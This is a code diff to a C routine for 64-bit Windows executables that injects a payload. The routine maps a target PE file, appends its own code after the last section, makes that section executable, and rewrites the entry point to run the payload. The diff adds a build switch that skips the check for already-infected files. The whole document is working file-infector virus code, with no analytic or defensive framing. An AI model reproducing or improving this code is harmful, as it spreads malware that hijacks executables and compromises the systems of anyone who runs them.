@@ -5,10 +5,12 @@
 
 EXTERN_C_START
 extern CONST BYTE __payload_start;
-extern CONST DWORD signature;
 extern CONST VOID payload();
 extern CONST LONGLONG delta_start;
 extern CONST DWORD code_size;
+#ifndef SKIP_SIGN
+extern CONST DWORD signature;
+#endif
 EXTERN_C_END
 
 __declspec(code_seg("injected")) VOID inj_code_c() {
@@ -79,11 +81,14 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
     HANDLE hFile, hMapFile;
     LPVOID pMapAddress;
-    DWORD dwFileSize, dwNewFileSize, dwSignature;
+    DWORD dwFileSize, dwNewFileSize;
+#ifndef SKIP_SIGN
+    DWORD dwSignature;
+#endif
     PCIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
-    DWORD dwLastSectionPtr, dwLastSectionSize, dwOrigEntryPoint, dwSizeAligned;
+    DWORD dwLastSectionPtr, dwLastSectionSize, dwLastSectionRva, dwOrigEntryPoint, dwSizeAligned;
     PBYTE pPayloadData;
 
     do {
@@ -143,18 +148,21 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         pLastSection = &pSection[pNtHeader->FileHeader.NumberOfSections - 1];
         dwLastSectionPtr = pLastSection->PointerToRawData;
         dwLastSectionSize = pLastSection->SizeOfRawData;
+        dwLastSectionRva = pLastSection->VirtualAddress;
         pPayloadData = (PBYTE)pDosHeader + dwLastSectionPtr + dwLastSectionSize;
         dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
 
-        if (dwOrigEntryPoint >= pLastSection->VirtualAddress &&
-            dwOrigEntryPoint < pLastSection->VirtualAddress + dwLastSectionSize) {
+#ifndef SKIP_SIGN
+        if (dwOrigEntryPoint >= dwLastSectionRva &&
+            dwOrigEntryPoint < dwLastSectionRva + dwLastSectionSize) {
             dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
-                                     (dwOrigEntryPoint - pLastSection->VirtualAddress) -
+                                     (dwOrigEntryPoint - dwLastSectionRva) -
                                      ((PCBYTE)&payload - (PCBYTE)&signature));
             if (dwSignature == signature) {
                 goto error;
             }
         }
+#endif
 
         dwSizeAligned = ALIGN(code_size, pNtHeader->OptionalHeader.FileAlignment);
         // ^ Compute aligned size earlier
@@ -164,12 +172,12 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
                                                     ? dwSizeAligned
                                                     : pLastSection->SizeOfRawData;
         pNtHeader->OptionalHeader.SizeOfImage =
-            ALIGN(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize,
+            ALIGN(dwLastSectionRva + pLastSection->Misc.VirtualSize,
                   pNtHeader->OptionalHeader.SectionAlignment);
         pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
         pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
         pNtHeader->OptionalHeader.AddressOfEntryPoint =
-            pLastSection->VirtualAddress + dwLastSectionSize +
+            dwLastSectionRva + dwLastSectionSize +
             (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
 
         my_memcpy(pPayloadData, (PCBYTE)&__payload_start, code_size);
